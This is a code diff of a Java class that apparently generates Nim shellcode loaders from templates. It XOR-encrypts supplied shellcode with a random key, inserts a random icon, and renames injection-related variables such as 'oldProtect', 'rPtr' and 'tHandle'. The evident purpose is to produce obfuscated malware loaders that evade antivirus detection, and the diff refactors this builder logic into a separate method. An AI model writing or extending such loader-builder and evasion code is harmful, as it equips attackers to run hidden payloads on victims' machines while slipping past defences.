@@ -16,31 +16,34 @@ public class TextFileProcessor {
     private static final int MAX_LETTER_LENGTH = 10;
 
     private static ApplicationProperties applicationProperties;
-
+    static final String TEMPLATE_ICON_PLACEHOLDER = "{{ICON}}";
+    static final String TEMPLATE_KEY_PLACEHOLDER = "{{Key}}";
+    static final String TEMPLATE_LEN_PLACEHOLDER = "{{Len}}";
+    static final String TEMPLATE_SHELLCODE_PLACEHOLDER = "{{Shellcode}}";
     @Autowired
     public void setApplicationProperties(ApplicationProperties applicationProperties) {
         TextFileProcessor.applicationProperties = applicationProperties;
     }
     public static String processTemplate(String code, String selectedTemplate) throws IOException {
         String processedCode = readTemplateFromFile(selectedTemplate);
-
-        if (selectedTemplate.equals("x2Ldr-Plus.nim")) {
-            byte[] key = generateRandomString(8).getBytes();
-            code = TextFileProcessor.convertToHexStringWithPrefix(xorEncrypt(convertHexStringToByteArray(code), key));
-            processedCode = processedCode.replace("{{Key}}", convertToHexStringWithPrefix(key));
+        if (selectedTemplate.endsWith("nim")) {
+            processedCode = processNimTemplate(code, processedCode);
         }
-        System.out.println(code);
-
-        int occurrences = countCommas(code);
-        processedCode = processedCode.replace("{{Len}}", String.valueOf(occurrences + 1));
-        processedCode = processedCode.replace("{{Shellcode}}", code);
-
 
         List<String> variableNamesToReplace = Arrays.asList("calc_payload", "calc_len", "calc", "rv", "th", "oldProtect", "tId", "rPtr", "wSuccess", "tHandle");
-
         processedCode = TextFileProcessor.replaceVariableNames(processedCode, variableNamesToReplace);
 
         return processedCode;
+    }
+
+    private static String processNimTemplate(String code, String processedCode) {
+        byte[] key = generateRandomString(8).getBytes();
+        String randomICON = FileProcessor.getRandomFileName();
+        code = TextFileProcessor.convertToHexStringWithPrefix(xorEncrypt(convertHexStringToByteArray(code), key));
+        return processedCode.replace(TEMPLATE_ICON_PLACEHOLDER, randomICON)
+                .replace(TEMPLATE_KEY_PLACEHOLDER, convertToHexStringWithPrefix(key))
+                .replace(TEMPLATE_LEN_PLACEHOLDER, String.valueOf(countCommas(code) + 1))
+                .replace(TEMPLATE_SHELLCODE_PLACEHOLDER, code);
     }
     public static String readTemplateFromFile(String templateFileName) throws IOException {
         String templateFilePath = applicationProperties.getTemplatesDirectory() + templateFileName;
